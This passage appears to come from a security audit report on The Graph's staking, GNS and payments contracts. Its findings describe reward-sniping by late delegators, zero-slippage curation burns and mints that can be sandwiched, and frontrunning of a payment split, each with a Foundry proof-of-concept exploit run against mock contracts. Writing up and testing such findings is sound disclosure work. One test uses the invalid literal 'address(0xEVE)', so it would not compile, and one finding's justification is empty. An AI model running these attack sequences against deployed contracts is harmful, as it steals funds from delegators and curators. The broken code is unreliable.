IncentiveMisalignmentOrGameTheory

## Location
L1Staking.delegate

## Finding Status: Valid
### Finding Status Justification: The in-scope code implements the described live-share reward accounting. In StakingExtension._delegate, a delegator receives shares immediately based on the current pool.tokens and pool.shares. Later, reward distribution in Staking adds delegationRewards directly to pool.tokens without tracking when each delegator entered. There is no per-user reward index, reward debt, minimum holding time, or allocation-period snapshot. Because a staked indexer can have pending collect() or closeAllocation() rewards, a large late delegator can enter before settlement and receive a pro-rata claim on rewards accrued earlier. No complete safeguard or documentation of accepted risk is present in the prompt.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are added to `pool.tokens` at distribution time and are shared by whoever owns pool shares at that moment. The system does not track `userRewardPerTokenPaid`, reward debt, minimum holding time, or a snapshot of pool shares for the allocation period. Vulnerable snippet: `shares = delegatedTokens.mul(pool.shares).div(pool.tokens); pool.tokens = pool.tokens.add(delegatedTokens); pool.shares = pool.shares.add(shares); ... pool.tokens = pool.tokens.add(delegationRewards);`. A large holder can delegate shortly before a known `collect()` or `closeAllocation()` reward distribution, receive shares at the pre-reward exchange rate, capture a pro-rata share of rewards earned before joining, then undelegate and withdraw after the normal unbonding period.

## Impact
Existing delegators are diluted out of historical rewards by short-term capital that did not participate during the reward accrual period. This can transfer GRT rewards from long-term delegators to late joiners.

## Proof of Concept
1. Existing delegators hold all shares while an allocation accrues rewards. 2. A large holder observes or anticipates a `closeAllocation()` or `collect()` transaction. 3. The holder calls `delegate()` immediately before settlement, minting shares against the pre-reward pool. 4. Settlement adds the historical reward amount to `pool.tokens`. 5. The late delegator's shares now redeem a pro-rata portion of rewards accrued before they joined.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract LateJoinHarness {
    uint32 constant MAX_PPM = 1_000_000;
    struct Delegation { uint256 shares; }
    struct Pool { uint32 indexingRewardCut; uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }
    Pool internal pool;
    function seedExisting(address user, uint256 tokens_, uint256 shares_) external { pool.tokens = tokens_; pool.shares = shares_; pool.indexingRewardCut = 0; pool.delegators[user].shares = shares_; }
    function delegate(address user, uint256 tokens_) external returns (uint256 shares) { shares = pool.tokens == 0 ? tokens_ : tokens_ * pool.shares / pool.tokens; pool.tokens += tokens_; pool.shares += shares; pool.delegators[user].shares += shares; }
    function distribute(uint256 rewards) external { uint256 indexerCut = uint256(pool.indexingRewardCut) * rewards / MAX_PPM; pool.tokens += rewards - indexerCut; }
    function claimable(address user) external view returns (uint256) { return pool.delegators[user].shares * pool.tokens / pool.shares; }
}

contract LateJoinerRewardTest is Test {
    function testLateJoinerCapturesHistoricalRewards() external {
        address longTerm = address(0xA11CE);
        address attacker = address(0xB0B);
        LateJoinHarness h = new LateJoinHarness();
        h.seedExisting(longTerm, 1_000 ether, 1_000 ether);
        h.delegate(attacker, 1_000 ether);
        h.distribute(1_000 ether);
        assertEq(h.claimable(attacker), 1_500 ether);
        assertGt(h.claimable(attacker), 1_000 ether);
        assertEq(h.claimable(longTerm), 1_500 ether);
    }
}

## Suggested Mitigation
Update rewards before any delegation share mint/burn, or track per-user reward debt/user index so new shares only earn rewards accrued after entry. For allocation-based rewards, snapshot eligible delegation shares at allocation creation or introduce an activation delay before new delegation shares participate in rewards.
```

### H-96 / `7RSC0BFXcdj5oyRxWspZQ`
- Finding title: Late delegators can sandwich reward distribution and steal accrued delegation rewards in L1Staking pools
- Report lines: 9007-9079
```md
## [H-96]. Late delegators can sandwich reward distribution and steal accrued delegation rewards in L1Staking pools

## id: 7RSC0BFXcdj5oyRxWspZQ

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
StakingExtension via L1Staking proxy.delegate / closeAllocation

## Finding Status: Valid
### Finding Status Justification: The described path exists in in-scope L1Staking/StakingExtension code. StakingExtension._delegate mints shares against the current pool ratio and immediately adds the new delegated tokens and shares. Later Staking._collectDelegationIndexingRewards and _collectDelegationQueryRewards add delegationRewards directly to pool.tokens for the live pool. There is no reward debt, userRewardPerTokenPaid, allocation snapshot, or holding-period guard in the provided code. A permissionless delegator can join a staked indexer before a reward distribution and later redeem shares for a pro-rata part of the added rewards. No complete safeguard or explicit accepted-risk documentation is shown.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are credited by increasing the shared pool token balance, while user entitlement is only the caller's current share balance. There is no userRewardPerTokenPaid, rewardDebt, per-allocation snapshot, or minimum holding period, so a delegator can buy shares immediately before a known reward distribution and receive a pro-rata part of rewards accrued before they joined. Vulnerable flow: _delegate mints shares from the current pool ratio with `shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens); pool.tokens = pool.tokens.add(delegatedTokens); pool.shares = pool.shares.add(shares);`. Later _collectDelegationIndexingRewards credits historical rewards to the same live pool with `delegationRewards = _tokens.sub(indexerCut); pool.tokens = pool.tokens.add(delegationRewards);`. Because rewards are not checkpointed to the delegators that existed during the allocation/reward accrual window, a late joiner captures historical rewards funded for earlier delegators.

## Impact
A permissionless attacker can dilute long-term delegators and extract unearned GRT rewards from protocol-held delegation pools. If large allocations or query-fee rewards are pending, this can cause significant user rewards to be stolen directly from the staking contract.

## Proof of Concept
1. Honest delegators hold shares in an indexer's delegation pool while an allocation accrues rewards. 2. Just before the indexer/operator closes the allocation, or before a collect call that will credit delegation rewards, the attacker delegates a large amount to the same indexer. 3. The attacker receives shares at the pre-reward pool price. 4. The reward distribution increases pool.tokens for all current shares, including the attacker's newly minted shares. 5. The attacker undelegates after the reward is credited and later withdraws principal plus a pro-rata share of rewards that accrued before the attacker joined. 6. Existing delegators receive less than their time-weighted share of the rewards.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract DelegationPoolHarness {
    struct Delegation { uint256 shares; }
    struct Pool { uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }
    Pool internal pool;
    function delegate(address user, uint256 tokens) external {
        uint256 shares = pool.tokens == 0 ? tokens : tokens * pool.shares / pool.tokens;
        require(shares > 0);
        pool.tokens += tokens;
        pool.shares += shares;
        pool.delegators[user].shares += shares;
    }
    function distributeRewards(uint256 amount) external {
        if (pool.tokens > 0) pool.tokens += amount;
    }
    function position(address user) external view returns (uint256) {
        return pool.delegators[user].shares * pool.tokens / pool.shares;
    }
}
contract RewardFreeRiderPoC is Test {
    function testLateJoinerCapturesHistoricalRewards() public {
        address alice = address(uint160(0xA11CE));
        address attacker = address(uint160(0xBEEF));
        DelegationPoolHarness h = new DelegationPoolHarness();
        h.delegate(alice, 100 ether);
        uint256 aliceBefore = h.position(alice);
        h.delegate(attacker, 900 ether);
        h.distributeRewards(100 ether);
        uint256 attackerValue = h.position(attacker);
        uint256 aliceAfter = h.position(alice);
        assertEq(aliceBefore, 100 ether);
        assertEq(attackerValue, 990 ether);
        assertEq(aliceAfter, 110 ether);
        assertGt(attackerValue, 900 ether);
        assertEq(attackerValue - 900 ether, 90 ether);
    }
}

## Suggested Mitigation
Checkpoint delegation rewards at accrual boundaries. Add per-user reward debt/userRewardPerTokenPaid or snapshot pool shares eligible for each allocation/reward event, and only distribute rewards to delegators that were present during the accrual period. Alternatively enforce a holding/activation delay so newly delegated shares cannot receive already-accrued rewards.
```

### H-101 / `cU-ypYxVo_gtLnb-Qkh8S`
- Finding title: Zero-slippage curation rollover in GNS.publishNewVersion lets MEV extract curator value during upgrades
- Report lines: 9439-9501
```md
## [H-101]. Zero-slippage curation rollover in GNS.publishNewVersion lets MEV extract curator value during upgrades

## id: cU-ypYxVo_gtLnb-Qkh8S

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
GNS inherited by L1GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: L1GNS inherits the in-scope GNS.publishNewVersion implementation. The function performs the claimed rollover using curation.burn(oldDeployment, vSignal, 0) and curation.mint(newDeployment, tokensWithTax, 0), with no owner-supplied minimums or deadline. The path is reachable for active subgraphs with nonzero nSignal. Public curation trading can affect execution-time outputs, and there is no complete on-chain safeguard against accepting a worse old-deployment burn price. The issue does not depend on governance abuse, leaked credentials, or future integrations.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1GNS inherits GNS.publishNewVersion(). When a subgraph owner upgrades to a new deployment, the function burns all old deployment vSignal and mints new deployment vSignal with minimum outputs hardcoded to zero. Vulnerable snippet: uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);. There is no owner-supplied minimum tokensOut, minimum vSignalOut, or deadline, so a mempool actor can trade around the old curation curve before the upgrade and force the rollover to execute at a worse price instead of reverting.

## Impact
A profitable MEV/economic attack can extract GRT value from existing curators during large subgraph upgrades. If the affected subgraph has more than $1M of curated value, the loss can satisfy the program's High economic-loss impact.

## Proof of Concept
1. A valuable subgraph has large nSignal/vSignal backed by GRT in the old deployment. 2. The owner submits publishNewVersion(oldSubgraph, newDeployment). The calldata reveals the target and the transaction accepts any burn/mint output because both minOut arguments are zero. 3. An attacker front-runs by trading against the old deployment curve to worsen the burn price. 4. The owner's transaction executes and rolls all curator value through the manipulated price instead of reverting. 5. The attacker back-runs to close the position, keeping the value extracted from the curators' rolled-over curation position.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    mapping(bytes32 => bool) public curated;
    mapping(bytes32 => uint256) public bps;
    function seed(bytes32 id, uint256 priceBps) external { curated[id] = true; bps[id] = priceBps; }
    function setBps(bytes32 id, uint256 priceBps) external { bps[id] = priceBps; }
    function isCurated(bytes32 id) external view returns (bool) { return curated[id]; }
    function burn(bytes32 id, uint256 amount, uint256 minOut) external returns (uint256) { uint256 out = amount * bps[id] / 10000; require(out >= minOut, "min"); return out; }
    function mint(bytes32 id, uint256 tokens, uint256 minOut) external returns (uint256, uint256) { uint256 out = tokens * 10000 / bps[id]; require(out >= minOut, "min"); curated[id] = true; return (out, 0); }
}

contract GNSHarness {
    MockCuration public c;
    bytes32 public dep;
    uint256 public vSignal = 1_000_000 ether;
    uint256 public nSignal = 1_000_000 ether;
    address public owner;
    constructor(MockCuration c_, bytes32 oldDep) { c = c_; dep = oldDep; owner = msg.sender; }
    function publishNewVersion(bytes32 newDep) external { require(msg.sender == owner, "auth"); require(!c.isCurated(newDep), "precurated"); if (nSignal != 0) { uint256 tokens = c.burn(dep, vSignal, 0); (vSignal,) = c.mint(newDep, tokens, 0); } dep = newDep; }
}

contract PublishNewVersionSlippageTest is Test {
    bytes32 constant OLD = keccak256("old");
    bytes32 constant NEW = keccak256("new");
    function testZeroMinAcceptsManipulatedBurnPrice() public { MockCuration c = new MockCuration(); c.seed(OLD, 10000); c.setBps(NEW, 10000); GNSHarness h = new GNSHarness(c, OLD); c.setBps(OLD, 1000); h.publishNewVersion(NEW); assertEq(h.vSignal(), 100_000 ether); assertLt(h.vSignal(), 1_000_000 ether); }
}

## Suggested Mitigation
Extend publishNewVersion with caller-specified minimum tokensOut and minimum vSignalOut, plus a deadline. Pass those values to curation.burn and curation.mint instead of zero, and revert when the rollover cannot meet the owner's bounded execution price.
```

### H-104 / `iZX9MsnPKZcfo1sxrLMde`
- Finding title: L1GNS.sendSubgraphToL2 burns all curation signal with minOut=0, allowing MEV to extract migration value
- Report lines: 9704-9849
```md
## [H-104]. L1GNS.sendSubgraphToL2 burns all curation signal with minOut=0, allowing MEV to extract migration value

## id: iZX9MsnPKZcfo1sxrLMde

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
L1GNS.sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: The in-scope L1GNS.sendSubgraphToL2 function unconditionally calls curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0), then uses the returned curationTokens as the accounting base for tokensForL2 and withdrawableGRT. There is no minimum curationTokens output, owner share minimum, deadline, or price check. For a nonzero-signal subgraph, a public curation market move before execution can reduce the accepted redemption value. The issue does not require a trusted role, compromised key, user-only misuse, or future code changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`sendSubgraphToL2()` converts the entire subgraph curation position into GRT using a hard-coded zero minimum output, then immediately splits the returned amount between the owner bridge transfer and remaining L1 curator withdrawals. Vulnerable snippet: `uint256 curationTokens = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... uint256 tokensForL2 = ownerNSignal.mul(curationTokens).div(totalSignal); ... subgraphData.withdrawableGRT = curationTokens.sub(tokensForL2);`. Because the caller cannot specify a minimum acceptable `curationTokens`, a permissionless trader/searcher can manipulate the underlying Curation market immediately before the owner migration transaction and let the migration settle at a much worse redemption value. The reduced `curationTokens` becomes the canonical accounting base, permanently reducing both the amount bridged for the owner and the withdrawable balance left for non-owner curators.

## Impact
For a heavily curated subgraph, MEV can extract a material portion of the GRT backing during migration. If the subgraph has more than $1M of curation value, the loss can satisfy the program's High smart-contract impact for significant user funds lost or stolen directly from protocol contracts.

## Proof of Concept
1. A valuable subgraph has substantial `vSignal` and `nSignal` in L1GNS. 2. The owner submits `sendSubgraphToL2()` to migrate the subgraph. 3. A permissionless curation trader observes the transaction and front-runs by moving the Curation market so `curation().burn(..., 0)` returns far fewer GRT than the owner/curators expected. 4. L1GNS accepts the manipulated redemption because the min-out argument is hard-coded to zero. 5. L1GNS disables the subgraph, burns the NFT, bridges only the reduced owner share, and records only the reduced residual `withdrawableGRT` for other curators. 6. The attacker back-runs/unwinds the curation trade, keeping the value extracted from the migration slippage.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockCuration {
    uint256 public burnReturn;
    function setBurnReturn(uint256 v) external { burnReturn = v; }
    function burn(bytes32, uint256, uint256 minOut) external view returns (uint256) {
        require(burnReturn >= minOut);
        return burnReturn;
    }
}

contract MockToken {
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract MockGateway {
    uint256 public lastAmount;
    address public lastTo;
    function outboundTransfer(address, address to, uint256 amount, uint256, uint256, bytes calldata) external payable returns (bytes memory) {
        lastTo = to;
        lastAmount = amount;
        return new bytes(0);
    }
}

contract L1GNSLike {
    struct SubgraphData {
        bytes32 deployment;
        uint256 vSignal;
        uint256 nSignal;
        uint256 withdrawableGRT;
        bool disabled;
        mapping(address => uint256) curatorNSignal;
    }

    mapping(uint256 => SubgraphData) internal subgraphs;
    mapping(uint256 => address) public owners;
    mapping(uint256 => bool) public subgraphTransferredToL2;
    MockCuration public curation;
    MockToken public token;
    MockGateway public gateway;
    address public counterpartGNSAddress = address(0xBEEF);

    constructor(MockCuration c, MockToken t, MockGateway g) {
        curation = c;
        token = t;
        gateway = g;
    }

    function seed(uint256 id, address owner, uint256 ownerSig, uint256 totalSig, uint256 vSig) external {
        owners[id] = owner;
        SubgraphData storage s = subgraphs[id];
        s.deployment = bytes32(uint256(1));
        s.curatorNSignal[owner] = ownerSig;
        s.nSignal = totalSig;
        s.vSignal = vSig;
    }

    function sendSubgraphToL2(uint256 id, address l2Owner, uint256 maxGas, uint256 gasPriceBid, uint256 maxSubmissionCost) external payable {
        require(!subgraphTransferredToL2[id]);
        require(msg.value == maxSubmissionCost + maxGas * gasPriceBid);
        SubgraphData storage s = subgraphs[id];
        require(owners[id] == msg.sender);
        subgraphTransferredToL2[id] = true;

        uint256 curationTokens = curation.burn(s.deployment, s.vSignal, 0);
        s.disabled = true;
        s.vSignal = 0;

        uint256 ownerNSignal = s.curatorNSignal[msg.sender];
        uint256 totalSignal = s.nSignal;
        uint256 tokensForL2 = ownerNSignal * curationTokens / totalSignal;

        s.curatorNSignal[msg.sender] = 0;
        s.nSignal = totalSignal - ownerNSignal;
        s.withdrawableGRT = curationTokens - tokensForL2;

        bytes memory extraData = abi.encode(uint8(1), id, l2Owner);
        token.approve(address(gateway), tokensForL2);
        gateway.outboundTransfer{value: msg.value}(address(token), counterpartGNSAddress, tokensForL2, maxGas, gasPriceBid, abi.encode(maxSubmissionCost, extraData));
    }
}

contract L1GNSSlippagePoC is Test {
    function testMigrationAcceptsManipulatedBurnWithNoMinOut() public {
        address owner = address(0xA11CE);
        MockCuration curation = new MockCuration();
        MockToken token = new MockToken();
        MockGateway gateway = new MockGateway();
        L1GNSLike gns = new L1GNSLike(curation, token, gateway);

        gns.seed(1, owner, 500 ether, 1000 ether, 1000 ether);

        uint256 fairCurationTokens = 2_000_000 ether;
        uint256 fairOwnerShare = fairCurationTokens / 2;

        curation.setBurnReturn(1 ether);
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        gns.sendSubgraphToL2{value: 1 ether}(1, address(0xCAFE), 1, 1 ether, 0);

        assertEq(gateway.lastAmount(), 5e17);
        assertGt(fairOwnerShare, gateway.lastAmount());
    }
}

## Suggested Mitigation
Add explicit slippage parameters to migration flows, e.g. `_curationTokensOutMin` and optionally `_tokensForL2Min`, and pass `_curationTokensOutMin` into `curation().burn(...)` instead of zero. Revert if the resulting owner bridge amount or residual withdrawable amount is below caller-provided bounds. The same hard-coded zero-min pattern should be removed from inherited lifecycle flows that burn or remint curation positions.
```

### H-110 / `YjdZsvlnh_K-EsSgIcb0d`
- Finding title: MEV delegation frontrun can siphon GraphPayments.collect receiver proceeds into an attacker-owned pool
- Report lines: 10171-10371
```md
## [H-110]. MEV delegation frontrun can siphon GraphPayments.collect receiver proceeds into an attacker-owned pool

## id: YjdZsvlnh_K-EsSgIcb0d

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
FrontrunMev

## Location
GraphPayments.collect

## Finding Status: Valid
### Finding Status Justification: The cited root cause is present in in-scope production code at GraphPayments.collect. The function is external, pulls the caller's GRT, then computes the payment split from live HorizonStaking state during execution. It reads getDelegationPool(receiver,dataService), and if pool.shares > 0 it computes tokensDelegationPool using the live getDelegationFeeCut and sends that amount to HorizonStaking.addToDelegationPool. If pool.shares is zero, that branch is skipped and the remaining tokens are sent to receiverDestination or staked to the receiver. The function exposes no caller-supplied maxDelegationPoolAmount, minReceiverAmount, expected pool shares, expected fee cut, or deadline, so there is no complete safeguard against a same-block/mempool state change before collection. The GraphPayments.sol path is explicitly in scope and GraphPayments is an in-scope Arbitrum asset. No provided documentation explicitly accepts this exact MEV redirection risk as intentional. Based on the provided protocol context that delegation pools exist and participants can delegate, the frontrun path is realistic today rather than speculative; uncertainty about exact HorizonStaking internals is not enough to invalidate under the instructed standard. The attack does not require governance, admin, leaked keys, or trusted-role abuse, and it is not solely victim misuse because the protocol settlement function itself prices a value split from mutable live state without authorization guards.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GraphPayments.collect prices the receiver/delegator split from live HorizonStaking state at execution time and gives the caller no maxDelegationPoolAmount, minReceiverAmount, deadline, or expected pool-state guard. A pending payment that would route all remaining GRT to the receiver when pool.shares == 0 can be frontrun by a permissionless delegator creating the first shares for (receiver, dataService). collect then observes pool.shares > 0 and diverts tokensRemaining by the live delegation fee cut into addToDelegationPool, letting the attacker-owned pool capture value that the payer expected to reach receiverDestination or receiver stake.

Vulnerable snippet:
IHorizonStakingTypes.DelegationPool memory pool = _graphStaking().getDelegationPool(receiver, dataService);
if (pool.shares > 0) {
    tokensDelegationPool = tokensRemaining.mulPPMRoundUp(
        _graphStaking().getDelegationFeeCut(receiver, dataService, paymentType)
    );
    tokensRemaining = tokensRemaining - tokensDelegationPool;
}
...
if (tokensDelegationPool > 0) {
    _graphToken().approve(address(_graphStaking()), tokensDelegationPool);
    _graphStaking().addToDelegationPool(receiver, dataService, tokensDelegationPool);
}

## Impact
A mempool searcher can redirect the delegation-fee portion of high-value GRT payments away from the intended receiver into an attacker-controlled delegation position. If the live delegation fee cut is large and the pending collection is large, this can cause significant receiver/user funds to be stolen directly through protocol settlement.

## Proof of Concept
1. A payer prepares collect(receiver, tokens, dataService, dataServiceCut=0, receiverDestination=receiver) after observing getDelegationPool(receiver,dataService).shares == 0, so no delegation-pool amount should be taken.
2. A searcher sees the pending collect transaction.
3. The searcher frontruns by creating the first delegation shares in HorizonStaking for the same receiver/dataService pool.
4. The payer's collect executes after the frontrun and rereads live pool.shares > 0.
5. GraphPayments applies the live delegation fee cut and transfers tokensDelegationPool to addToDelegationPool.
6. Because the attacker owns the pool shares, the attacker captures the newly added GRT instead of the receiver receiving it.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function burn(uint256 amount) external { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; }
}

contract MockStaking {
    struct DelegationPool { uint256 shares; }

    MockGRT public immutable token;
    mapping(bytes32 => DelegationPool) internal pools;
    mapping(bytes32 => address) public onlyShareOwner;

    constructor(MockGRT token_) { token = token_; }

    function _key(address receiver, address dataService) internal pure returns (bytes32) {
        return keccak256(abi.encode(receiver, dataService));
    }

    function delegate(address receiver, address dataService, uint256 shares) external {
        bytes32 key = _key(receiver, dataService);
        pools[key].shares += shares;
        onlyShareOwner[key] = msg.sender;
    }

    function getDelegationPool(address receiver, address dataService) external view returns (DelegationPool memory) {
        return pools[_key(receiver, dataService)];
    }

    function getDelegationFeeCut(address, address, uint8) external pure returns (uint256) {
        return 1_000_000; // 100% fee cut to make the value redirection explicit.
    }

    function addToDelegationPool(address receiver, address dataService, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.transfer(onlyShareOwner[_key(receiver, dataService)], amount);
    }

    function stakeTo(address, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
}

contract VulnerableGraphPayments {
    uint256 internal constant MAX_PPM = 1_000_000;
    MockGRT public immutable token;
    MockStaking public immutable staking;
    uint256 public immutable protocolCut;

    constructor(MockGRT token_, MockStaking staking_, uint256 protocolCut_) {
        token = token_;
        staking = staking_;
        protocolCut = protocolCut_;
    }

    function _mulUp(uint256 a, uint256 ppm) internal pure returns (uint256) {
        return a - ((a * (MAX_PPM - ppm)) / MAX_PPM);
    }

    function collect(uint8 paymentType, address receiver, uint256 tokens, address dataService, uint256 dataServiceCut, address receiverDestination) external {
        require(dataServiceCut <= MAX_PPM, "bad cut");
        token.transferFrom(msg.sender, address(this), tokens);

        uint256 tokensRemaining = tokens;
        uint256 tokensProtocol = _mulUp(tokensRemaining, protocolCut);
        tokensRemaining -= tokensProtocol;

        uint256 tokensDataService = _mulUp(tokensRemaining, dataServiceCut);
        tokensRemaining -= tokensDataService;

        uint256 tokensDelegationPool;
        MockStaking.DelegationPool memory pool = staking.getDelegationPool(receiver, dataService);
        if (pool.shares > 0) {
            tokensDelegationPool = _mulUp(tokensRemaining, staking.getDelegationFeeCut(receiver, dataService, paymentType));
            tokensRemaining -= tokensDelegationPool;
        }

        token.burn(tokensProtocol);
        token.transfer(dataService, tokensDataService);

        if (tokensDelegationPool > 0) {
            token.approve(address(staking), tokensDelegationPool);
            staking.addToDelegationPool(receiver, dataService, tokensDelegationPool);
        }

        if (tokensRemaining > 0) {
            if (receiverDestination == address(0)) {
                token.approve(address(staking), tokensRemaining);
                staking.stakeTo(receiver, tokensRemaining);
            } else {
                token.transfer(receiverDestination, tokensRemaining);
            }
        }
    }
}

contract GraphPaymentsFrontrunPoC is Test {
    address payer = address(0xA11CE);
    address receiver = address(0xB0B);
    address dataService = address(0xDADA);
    address attacker = address(0xEVE);

    function testFrontrunDelegationPoolStealsReceiverPayment() external {
        MockGRT token = new MockGRT();
        MockStaking staking = new MockStaking(token);
        VulnerableGraphPayments payments = new VulnerableGraphPayments(token, staking, 0);

        uint256 amount = 1_000_000 ether;
        token.mint(payer, amount);

        MockStaking.DelegationPool memory beforePool = staking.getDelegationPool(receiver, dataService);
        assertEq(beforePool.shares, 0);

        vm.prank(payer);
        token.approve(address(payments), amount);

        vm.prank(attacker);
        staking.delegate(receiver, dataService, 1);

        vm.prank(payer);
        payments.collect(0, receiver, amount, dataService, 0, receiver);

        assertEq(token.balanceOf(attacker), amount);
        assertEq(token.balanceOf(receiver), 0);
    }
}

## Suggested Mitigation
Add caller-specified settlement guards to collect, such as maxDelegationPoolAmount, minReceiverAmount, expectedPoolShares or expectedDelegationFeeCut, and a deadline. Revert if live pool eligibility or fee cut differs from the caller-authorized terms. Alternatively snapshot payment terms in an authenticated upstream collector and require a minimum delegation age before a pool can receive GraphPayments delegation allocations.
```

### H-111 / `u2iIZVIBB1bS5kZQBCykf`
- Finding title: Zero-slippage version upgrade in L1GNS.publishNewVersion exposes all name curators to curation sandwich loss
- Report lines: 10372-10496
```md
## [H-111]. Zero-slippage version upgrade in L1GNS.publishNewVersion exposes all name curators to curation sandwich loss

## id: u2iIZVIBB1bS5kZQBCykf

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
L1GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 5
## Minimim Privilege Required:Permissionless


## Description
`publishNewVersion()` is inherited by L1GNS and migrates all name-signal backing from the old deployment to a new deployment using two external Curation trades with hardcoded zero slippage limits. Vulnerable snippet: `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`. The subgraph owner cannot specify either a minimum token return from the old deployment or a minimum vSignal amount from the new deployment. A permissionless curation trader can sandwich the old-deployment burn, the new-deployment mint, or both, causing the inherited L1GNS upgrade path to accept materially worse execution for all existing name curators. Because `subgraphData.nSignal` remains constant while `subgraphData.vSignal` is overwritten with the manipulated mint result, the degraded execution becomes the new share price for every curator in the subgraph.

## Impact
Existing name curators can suffer direct GRT value loss during owner-initiated version upgrades. On large subgraphs, MEV extraction around the forced zero-minimum curation trades can exceed $1M, while the attack remains permissionless and does not require governance or token misconfiguration.

## Proof of Concept
1. A subgraph has substantial name signal backed by vSignal in an old Curation deployment. 2. The owner submits `publishNewVersion()` to move the subgraph to a new deployment. 3. A MEV trader front-runs by moving the old deployment's Curation price against the pending GNS burn, reducing the GRT returned to L1GNS. 4. The owner transaction executes with `minOut = 0`, accepts the low token return, charges owner tax, and mints on the new deployment with `minSignal = 0`. 5. The attacker back-runs to unwind the manipulation. The subgraph's curators are left with the same `nSignal` supply but less backing vSignal/GRT than a bounded upgrade would have accepted.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockCurationForUpgrade {
    uint256 public burnReturn;
    uint256 public mintReturn;

    function setReturns(uint256 burnReturn_, uint256 mintReturn_) external {
        burnReturn = burnReturn_;
        mintReturn = mintReturn_;
    }

    function isCurated(bytes32) external pure returns (bool) {
        return false;
    }

    function curationTaxPercentage() external pure returns (uint32) {
        return 0;
    }

    function burn(bytes32, uint256, uint256 minOut) external view returns (uint256) {
        require(burnReturn >= minOut, "min burn");
        return burnReturn;
    }

    function mint(bytes32, uint256, uint256 minSignal) external view returns (uint256, uint256) {
        require(mintReturn >= minSignal, "min mint");
        return (mintReturn, 0);
    }
}

contract GNSUpgradeLike {
    struct SubgraphData {
        bytes32 subgraphDeploymentID;
        uint256 vSignal;
        uint256 nSignal;
    }

    MockCurationForUpgrade public curation;
    mapping(uint256 => SubgraphData) public subgraphs;
    mapping(uint256 => address) public ownerOf;

    constructor(MockCurationForUpgrade curation_) {
        curation = curation_;
    }

    function seed(uint256 subgraphID, address owner, uint256 nSignal, uint256 vSignal) external {
        subgraphs[subgraphID] = SubgraphData({subgraphDeploymentID: keccak256("old"), vSignal: vSignal, nSignal: nSignal});
        ownerOf[subgraphID] = owner;
    }

    function publishNewVersion(uint256 subgraphID, bytes32 newDeployment) external {
        require(ownerOf[subgraphID] == msg.sender, "GNS: Must be authorized");
        SubgraphData storage s = subgraphs[subgraphID];
        require(newDeployment != s.subgraphDeploymentID, "same");
        require(!curation.isCurated(newDeployment), "precurated");

        if (s.nSignal != 0) {
            // Mirrors the vulnerable GNS behavior: both limits are hardcoded to zero.
            uint256 tokens = curation.burn(s.subgraphDeploymentID, s.vSignal, 0);
            (s.vSignal, ) = curation.mint(newDeployment, tokens, 0);
        }
        s.subgraphDeploymentID = newDeployment;
    }
}

contract L1GNSPublishNewVersionSlippagePoC is Test {
    function testPublishNewVersionAcceptsManipulatedBurnAndMint() external {
        address owner = address(0xB0B);
        uint256 subgraphID = 7;
        MockCurationForUpgrade curation = new MockCurationForUpgrade();
        GNSUpgradeLike gns = new GNSUpgradeLike(curation);
        gns.seed(subgraphID, owner, 1000 ether, 1000 ether);

        uint256 fairNewVSignal = 1000 ether;
        uint256 manipulatedNewVSignal = 550 ether;
